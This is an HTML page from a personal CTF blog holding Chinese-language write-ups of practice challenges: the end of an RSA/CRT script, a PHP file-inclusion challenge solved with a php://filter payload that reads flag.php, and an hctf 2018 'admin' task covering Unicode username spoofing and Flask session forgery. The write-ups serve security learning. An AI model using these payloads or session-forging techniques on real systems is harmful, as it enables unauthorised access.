gcd(g2 - <span class="number">1</span>, n)</span><br><span class="line"><span class="keyword">assert</span> p * q == n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(c1, c2)</span>:</span></span><br><span class="line">    xp = c1 % p</span><br><span class="line">    xq = c2 % q</span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    m = (xp * inverse(q, p) * q + xq * inverse(p, q) * p) % n</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(long_to_bytes(decrypt(c1, c2)))</span><br></pre></td></tr></table></figure>

      
    </div>
    
      
    
  </section>
</article>

          </div>
        
      
        
          <div class='post-wrapper'>
            <article class="post white-box shadow reveal ">
  


  <section class='meta'>
    
      
      
      <div class="meta" id="header-meta">
        
          
  <h2 class="title">
    <a href="/2020/09/16/file/">
      Secret File[极客大挑战 2019]
    </a>
  </h2>


        
        <div class='new-meta-box'>
          
            
          
            
              
<div class='new-meta-item author'>
  <a href="" rel="nofollow">
    <img src="https://ae01.alicdn.com/kf/H68ac7f1be81b4260813ba8136aef8160J.jpg">
    <p>omp</p>
  </a>
</div>

            
          
            
              
  
  <div class='new-meta-item category'>
    <a href='/categories/web/' rel="nofollow">
      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
      <p>web</p>
    </a>
  </div>


            
          
            
              <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：Sep 16, 2020</p>
  </a>
</div>

            
          
            
              

            
          
            
              
  <div class="new-meta-item browse valine">
    <a class='notlink'>
      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
      <span id="/2020/09/16/file/" class="leancloud_visitors" data-flag-title="Secret File[极客大挑战 2019]">
      <p>
        <span class="leancloud-visitors-count"></span>
      </p>
      </span>
    </a>
  </div>


            
          
            
          
            
          
            
              

            
          
        </div>
        
          <hr>
        
      </div>
    
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      
        <p>查看源码发现Archive_room.php</p>
<p>接着是action.php</p>
<p>但由于访问时间过短直接跳转到end.php</p>
<p>使用burpsuite抓包</p>
<p><img src="/2020/09/16/file/image-20200904150424108.png" alt="image-20200904150424108"></p>
<p>发现secr3t.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $file=$_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strstr($file,<span class="string">"../"</span>)||stristr($file, <span class="string">"tp"</span>)||stristr($file,<span class="string">"input"</span>)||stristr($file,<span class="string">"data"</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Oh no!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>($file); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>文件包含漏洞并并过滤掉了一些关键词</p>
<p>学习到了对于文件包含漏洞用php伪协议读取文件</p>
<p>学习出处：<a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">https://www.freebuf.com/column/148886.html</a></p>
<p>file://后加文件的绝对路径和文件名</p>
<p>php://协议</p>
<p>1.php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。</p>
<p>学习出处：<a href="https://blog.csdn.net/destiny1507/article/details/82347371" target="_blank" rel="noopener">https://blog.csdn.net/destiny1507/article/details/82347371</a></p>
<p>基本使用：?file=php://filter/read=convert.base64-encode/resource=xxx.php</p>
<p>各参数作用：</p>
<p><img src="/2020/09/16/file/image-20200904151413498.png" alt="image-20200904151413498"></p>
<p>2.php://input</p>
<p><strong>php://input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p>
<p>其余php封装协议</p>
<p><img src="/2020/09/16/file/15063209941952.png!small" alt="常规小节.png"></p>
<p>/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
<p>读取到flag的base64编码后形式，解码即可找到flag</p>

      
    </div>
    
      
    
  </section>
</article>

          </div>
        
      
        
          <div class='post-wrapper'>
            <article class="post white-box shadow reveal ">
  


  <section class='meta'>
    
      
      
      <div class="meta" id="header-meta">
        
          
  <h2 class="title">
    <a href="/2020/09/16/2018/">
      admin[hctf 2018]
    </a>
  </h2>


        
        <div class='new-meta-box'>
          
            
          
            
              
<div class='new-meta-item author'>
  <a href="" rel="nofollow">
    <img src="https://ae01.alicdn.com/kf/H68ac7f1be81b4260813ba8136aef8160J.jpg">
    <p>omp</p>
  </a>
</div>

            
          
            
              
  
  <div class='new-meta-item category'>
    <a href='/categories/web/' rel="nofollow">
      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
      <p>web</p>
    </a>
  </div>


            
          
            
              <div class="new-meta-item date">
  <a class='notlink'>
    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
    <p>发布于：Sep 16, 2020</p>
  </a>
</div>

            
          
            
              

            
          
            
              
  <div class="new-meta-item browse valine">
    <a class='notlink'>
      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
      <span id="/2020/09/16/2018/" class="leancloud_visitors" data-flag-title="admin[hctf 2018]">
      <p>
        <span class="leancloud-visitors-count"></span>
      </p>
      </span>
    </a>
  </div>


            
          
            
          
            
          
            
              

            
          
        </div>
        
          <hr>
        
      </div>
    
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="对源文件的分析学习"><a href="#对源文件的分析学习" class="headerlink" title="对源文件的分析学习"></a>对源文件的分析学习</h2><h3 id="code-py"><a href="#code-py" class="headerlink" title="code.py"></a>code.py</h3><p><strong>random.sample</strong></p>
<p>多用于截取列表的指定长度的随机数，但是不会改变列表本身的排序：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">list = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">rs = random.sample(list, <span class="number">2</span>)</span><br><span class="line">print(rs)</span><br><span class="line">print(list)</span><br><span class="line"></span><br><span class="line">》》》[<span class="number">2</span>, <span class="number">4</span>]    <span class="comment">#此数组随着不同的执行，里面的元素随机，但都是两个</span></span><br><span class="line">》》》[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure>
<p><strong>string.digits</strong></p>
<p>digits方法的作用是生成字符串，包括0-9</p>
<p><strong>string.ascii_letters</strong></p>
<p>a-z A-Z</p>
<p>原来验证码是这样生成的(好神奇</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gene_text</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''生成4位验证码'''</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(random.sample(string.ascii_letters+string.digits, <span class="number">4</span>))</span><br></pre></td></tr></table></figure>
<h4 id="PIL库使用"><a href="#PIL库使用" class="headerlink" title="PIL库使用"></a><strong>PIL库使用</strong></h4><p>PIL.image</p>
<p><strong>1)新建图片对象</strong></p>
<p>im = Image.new(‘RGB’,(width, height),’white’)</p>
<p>如果不给color变量赋值，图像内容被设置为0,为黑色</p>
<p><strong>2)预览</strong></p>
<p>im.show()</p>
<p>PIL.ImageDraw</p>
<p><strong>1)新建draw对象</strong></p>
<p>draw=ImageDraw.Draw(im)</p>
<p><strong>2)绘制字符串</strong></p>
<p>draw.text((5+random.randint(-3,3)+23*item, 5+random.randint(-3,3)),</p>
<p>​         text=code[item], fill=rndColor(),font=font )</p>
<p>第一个参数为绘制开始坐标，第二个参数为需要绘制的文字内容，第三个参数为颜色</p>
<p><strong>高斯模糊</strong></p>
<p>对图像进行模糊处理 使用ImageFilter类</p>
<blockquote>
<p><strong>ImageFilter:Python中的图像滤波，主要对图像进行平滑、锐化、边界增强等滤波处理。</strong></p>
</blockquote>
<p>im = im.filter(ImageFilter.GaussianBlur(radius=1.5))</p>
<p>高斯模糊 GaussianBlur(radius=2)</p>
<p><strong>Image.save</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img.save(img_name, quality=<span class="number">95</span>)</span><br></pre></td></tr></table></figure>
<p>有些时候往往需要图片的大小不能变化太大或不能太小。所以在使用此方式时可以加入参数。quality参数： 保存图像的质量，值的范围从1（最差）到95（最佳）。 默认值为75，使用中应尽量避免高于95的值; 100会禁用部分JPEG压缩算法，并导致大文件图像质量几乎没有任何增益。</p>
<h3 id="routes-py"><a href="#routes-py" class="headerlink" title="routes.py"></a>routes.py</h3><p><strong>and/or</strong></p>
<p>学习出处：<a href="https://www.cnblogs.com/yonyong/p/9166067.html" target="_blank" rel="noopener">https://www.cnblogs.com/yonyong/p/9166067.html</a></p>
<p>and和or比较的结果不是布尔值，而是比较值之一</p>
<p>and</p>
<p>从左到右演算表达式，如果比较的值都为真，and返回最后一个值</p>
<p>如果某个值为假，and返回第一个假值</p>
<p>or</p>
<p>使用 or 时，在布尔上下文中从左到右演算值，就像 and 一样。如果有一个值为真，or 立刻返回该值 如果所有的值都为假，or 返回最后一个假值 注意 or 在布尔上下文中会一直进行表达式演算直到找到第一个真值，然后就会忽略剩余的比较值</p>
<p>故config.py中</p>
<p><code>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;</code></p>
<p>如果环境变量为空，那么key值将成为’ckj123’</p>
<p><strong>BytesIO</strong></p>
<p>Python在内存中读写数据，用到的模块是StringIO和BytesIO</p>
<p><strong>os.environ.get()</strong></p>
<p>os.environ.get（）是python中os模块获取环境变量的一个方法</p>
<p><strong>nodeprep.prepare</strong></p>
<p>nodeprep.prepare函数 nodeprep是从twisted模块中导入的from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</p>
<p>看师傅博客说 在requirements.txt文件中，发现这里用到的twisted版本是Twisted==10.2.0，而官网最新版本为19.2.0(2019/6/2)，版本差距过大可以判断有漏洞（原来如此</p>
<p>学习出处:<a href="https://hu3sky.github.io/2019/02/07/hctf/" target="_blank" rel="noopener">https://hu3sky.github.io/2019/02/07/hctf/</a></p>
<p><code>nodeprep.prepare()</code><br>这个函数会把大写转换为小写 并且<code>nodeprep.prepare()</code>会做如下转换<br>假如有一个<code>ᴬ</code>字符 第一次调用函数时会造成<code>ᴬ-&gt;A</code>，第二次调用时会<code>A-&gt;a</code></p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>学习出处:</p>
<p><a href="https://www.cnblogs.com/wangtanzhi/p/11861820.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/11861820.html</a></p>
<p><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/100733581</a></p>
<p>1.unicode欺骗</p>
<p>注册一个ᴬdmin账号 此时第一次调用nodeprep.prepare()账号变为<br>Admin() 此时进行登录，再次调用nodeprep.prepare()，页面显示Hello Admin,此时应已变成admin,修改密码再次调用，修改admin密码 再进行登录</p>
<p>2.flask session伪造</p>
<p>学习出处:<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html</a></p>
<p>通过这个工具(<a href="https://github.com/noraj/flask-session-cookie-manager)可以加密解密flask中session，大概看了一下具体的原理(因为太菜了，还没太看懂呜呜呜呜" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager)可以加密解密flask中session，大概看了一下具体的原理(因为太菜了，还没太看懂呜呜呜呜</a></p>
<p>大概分为这几步:</p>
<ol>
<li>json.dumps 将对象转换成json字符串，作为数据</li>
<li>如果数据压缩后长度更短，则用zlib库进行压缩</li>
<li>将数据用base64编码</li>
<li>通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割</li>
</ol>
<p>这里还有师傅写的解密的脚本,都记录一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(decryption(sys.argv[<span class="number">1</span>].encode()))</span><br></pre></td></tr></table></figure>
<p>拿到secret_key以后，伪造session重发即可拿到flag</p>
<p>还根据师傅的博客学习到利用解密session绕过验证码， 不过这道题里的session直接给了验证码hh</p>
<p>3.条件竞争</p>
<p><strong>threading.Thread类</strong></p>
<p>创建线程<code>thread=threading.Thread(target=function_name, args=(function_parameter1, function_parameterN))</code></p>
<p>function_name: 需要线程去执行的方法名</p>
<p>args: 线程执行方法接收的参数，该属性是一个<strong>元组</strong>，如果只有一个参数也需要在末尾加逗号。</p>
<p>启动创建的线程<code>thread.start()</code></p>
<p><strong>requests模块</strong></p>
<p>不带参数get请求<code>r=requests.get(&#39;&#39;)</code></p>
<p>带参数的get请求<code>r=requests.get(&#39;&#39;,params=url_params)</code></p>
<p>其中字典传递参数url_params={‘key’:’value’}</p>
<p>post请求<code>r=requests.post(&#39;&#39;)</code></p>
<p>带参数的post请求<code>r=requests.post(url,data=params)</code></p>
<p>params同样为字典传递参数</p>
<p><code>r=requests.post(url,data=params)</code></p>
<p><img src="https://images2017.cnblogs.com/blog/77835/201709/77835-20170907152822351-1210277893.png" alt="img"></p>
<p>r.text输出结果:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"args"</span>: &#123;&#125;, </span><br><span class="line">  <span class="string">"data"</span>: <span class="string">""</span>, </span><br><span class="line">  <span class="string">"files"</span>: &#123;&#125;, </span><br><span class="line">  <span class="string">"form"</span>: &#123;</span><br><span class="line">    <span class="string">"key1"</span>: <span class="string">"value1"</span>, </span><br><span class="line">    <span class="string">"key2"</span>: <span class="string">"value2"</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="string">"headers"</span>: &#123;</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"*/*"</span>, </span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, </span><br><span class="line">    <span class="string">"Connection"</span>: <span class="string">"close"</span>, </span><br><span class="line">    <span class="string">"Content-Length"</span>: <span class="string">"23"</span>, </span><br><span class="line">    <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, </span><br><span class="line">    <span class="string">"Host"</span>: <span class="string">"httpbin.org"</span>, </span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"python-requests/2.18.1"</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="string">"json"</span>: null, </span><br><span class="line">  <span class="string">"origin"</span>: <span class="string">"183.14.133.88"</span>, </span><br><span class="line">  <span class="string">"url"</span>: <span class="string">"http://httpbin.org/post"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    
      
    
  </section>
</article>

          </div>
        
      
    
  </section>
  
    
      <br>
      <div class="prev-next">
        
        <p class="current">
          1 / 3
        </p>
        
          <a class="next" rel="next" href="/page/2/">
            <section class="post next white-box shadow">
              &nbsp;Next&nbsp;<i class="fas fa-chevron-right" aria-hidden="true"></i>
            </section>
          </a>
        
      </div>
    
    <!-- 根据主题中的设置决定是否在archive中针对摘要部分的MathJax公式加载mathjax.js文件 -->
    
    
      <script async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
<!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script>
window.MathJax = {
  tex: {
    inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
    displayMath: [ ['$$','$$'], ["\\[","\\]"] ],
    processEscapes: true,
    tags: "ams",
    macros: {
      href: "{}"
    }
  },
  options: {
    ignoreHtmlClass: "tex2jax_ignore|dno",
    skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  }
};
</script>

    

  


</div>
<aside class='l_side'>
  
  
    
    

<section class="widget blogger shadow desktop mobile">
  <div class='content'>
    
      
        <a class='avatar flat-box' href='/about/'>
          <img no-lazy src='https://s3.ax1x.com/2021/01/03/spRpoq.jpg'/>
        </a>
      
    
    
      <div class='text'>
        
        
        
          <p><span id="jinrishici-sentence">omp's blog</span></p>
          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
        
      </div>
    
    
      <div class="social-wrapper">
        
          
            <a href="/atom.xml"
              class="social fas fa-rss flat-btn"
              target="_blank"
              rel="external nofollow noopener noreferrer">
            </a>
          
        
          
            <a href="mailto:me@xaoxuu.com"
              class="social fas fa-envelope flat-btn"
              target="_blank"
              rel="external nofollow noopener noreferrer">
            </a>
          
        
          
            <a href="https://github.com/xaoxuu"
              class="social fab fa-github flat-btn"
              target="_blank"
              rel="external nofollow noopener noreferrer">
            </a>
          
        
          
            <a href="https://music.163.com/#/user/home?id=63035382"
              class="social fas fa-headphones-alt flat-btn"
              target="_blank"
              rel="external nofollow noopener noreferrer">
            </a>
          
        
      </div>
    
  </div>
</section>

  

  
    
    
  

  <section class="widget category shadow desktop">
    
  <header>
    
      <a href='/blog/categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
    
  </header>


    <div class='content'>
      <ul class="entry navigation">
        
          <li><a class="flat-box"
            title="/categories/BUU%E5%88%B7%E9%A2%98/" href="/categories/BUU%E5%88%B7%E9%A2%98/"
            id="categoriesBUUE588B7E9A298"
            ><div class='name'>BUU刷题</div><div class='badge'>(5)</div></a></li>
        
          <li><a class="flat-box"
            title="/categories/CTF/" href="/categories/CTF/"
            id="categoriesCTF"
            ><div class='name'>CTF</div><div class='badge'>(2)</div></a></li>
        
          <li><a class="flat-box"
            title="/categories/java/" href="/categories/java/"
            id="categoriesjava"
            ><div class='name'>java</div><div class='badge'>(3)</div></a></li>
        
          <li><a class="flat-box"
            title="/categories/web/" href="/categories/web/"
            id="categoriesweb"
            ><div class='name'>web</div><div class='badge'>(8)</div></a></li>
        
          <li><a class="flat-box"
            title="/categories/%E5%85%B6%E4%BB%96/" href="/categories/%E5%85%B6%E4%BB%96/"
            id="categoriesE585B6E4BB96"
            ><div class='name'>其他</div><div class='badge'>(1)</div></a></li>
        
          <li><a class="flat-box"
            title="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
            id="categoriesE5ADA6E4B9A0E7AC94E8AEB0"
            ><div class='name'>学习笔记</div><div class='badge'>(1)</div></a></li>
        
          <li><a class="flat-box"
            title="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"
            id="categoriesE5AF86E7A081E5ADA6"
            ><div class='name'>密码学</div><div class='badge'>(4)</div></a></li>
        
          <li><a class="flat-box"
            title="/categories/%E6%9D%82%E9%A1%B9/" href="/categories/%E6%9D%82%E9%A1%B9/"
            id="categoriesE69D82E9A1B9"
            ><div class='name'>杂项</div><div class='badge'>(3)</div></a></li>
        
      </ul>
    </div>
  </section>


  

  
    
    
  

  <section class="widget tagcloud shadow desktop mobile">
    
  <header>
    
      <a href='/blog/tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
    
  </header>


    <div class='content'>
      <a href="/tags/AES/" style="font-size: 17.33px; color: #828282">AES</a> <a href="/tags/DLP/" style="font-size: 17.33px; color: #828282">DLP</a> <a href="/tags/ECC/" style="font-size: 14px; color: #999">ECC</a> <a href="/tags/RC4/" style="font-size: 14px; color: #999">RC4</a> <a href="/tags/RSA/" style="font-size: 20.67px; color: #6c6c6c">RSA</a> <a href="/tags/bot/" style="font-size: 14px; color: #999">bot</a> <a href="/tags/crt/" style="font-size: 14px; color: #999">crt</a> <a href="/tags/flask/" style="font-size: 14px; color: #999">flask</a> <a href="/tags/http/" style="font-size: 14px; color: #999">http</a> <a href="/tags/java/" style="font-size: 20.67px; color: #6c6c6c">java</a> <a href="/tags/knapsack/" style="font-size: 17.33px; color: #828282">knapsack</a> <a href="/tags/mt19937/" style="font-size: 14px; color: #999">mt19937</a> <a href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" style="font-size: 14px; color: #999">php伪协议</a> <a href="/tags/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/" style="font-size: 14px; color: #999">php弱类型</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 24px; color: #555">sql注入</a> <a href="/tags/ssti/" style="font-size: 17.33px; color: #828282">ssti</a> <a href="/tags/stream/" style="font-size: 14px; color: #999">stream</a> <a href="/tags/tornado/" style="font-size: 14px; color: #999">tornado</a> <a href="/tags/%E6%89%A9%E5%B1%95CRT/" style="font-size: 14px; color: #999">扩展CRT</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 14px; color: #999">文件包含</a> <a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 20.67px; color: #6c6c6c">杂项</a> <a href="/tags/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/" style="font-size: 14px; color: #999">源码泄露</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size: 14px; color: #999">编码</a>
    </div>
  </section>


  

  


</aside>


  
  <footer class="clearfix">
    <br><br>
    
      
        <div class="aplayer-container">
          

  
    <meting-js
      theme='#1BCDFC'
      autoplay='false'
      volume='0.7'
      loop='all'
      order='list'
      fixed='false'
      list-max-height='340px'
      server='netease'
      type='playlist'
      id='5004192906'
      list-folded='true'>
    </meting-js>
  


        </div>
      
    
      
        <br>
        <div class="social-wrapper">
          
            
              <a href="/atom.xml"
                class="social fas fa-rss flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
              </a>
            
          
            
              <a href="mailto:me@xaoxuu.com"
                class="social fas fa-envelope flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
              </a>
            
          
            
              <a href="https://github.com/xaoxuu"
                class="social fab fa-github flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
              </a>
            
          
            
              <a href="https://music.163.com/#/user/home?id=63035382"
                class="social fas fa-headphones-alt flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
              </a>
            
          
        </div>
      
    
      
        <div><p>Blog content follows the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
</div>
      
    
      
        Use
        <a href="https://volantis.js.org/" target="_blank" class="codename">Volantis</a>
        as theme, total visits
          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
          times
        
      
    
      
        <div class='copyright'>
        <p><a href="https://xaoxuu.com" target="_blank" rel="noopener">Copyright © 2017-2020 Mr. X</a></p>

        </div>
      
    
  </footer>

<script>setLoadingBarProgress(80);</script>


      <script>setLoadingBarProgress(60);</script>
    </div>
    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
  </div>
  
<script src="https://cdn.jsdelivr.net/npm/jquery@3.4/dist/jquery.min.js"></script>


  <script>
    
    var SEARCH_SERVICE = "hexo" || "hexo";
    var ROOT = "/" || "/";
    if (!ROOT.endsWith('/')) ROOT += '/';
  </script>


  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>


  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
  <script type="text/javascript">
    $(function() {
      ScrollReveal().reveal('.l_main .reveal', {
        distance: '8px',
        duration: '800',
        interval: '100',
        scale: '1'
      });
    });
  </script>


  
<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>

  <script type="text/javascript">
    $(function() {
      Waves.attach('.flat-btn', ['waves-button']);
      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
      Waves.attach('.flat-box', ['waves-block']);
      Waves.attach('.float-box', ['waves-block', 'waves-float']);
      Waves.attach('.waves-image');
      Waves.init();
    });
  </script>


  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>



  
  
  
    
<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>

    <script type="text/javascript">
      $(function(){
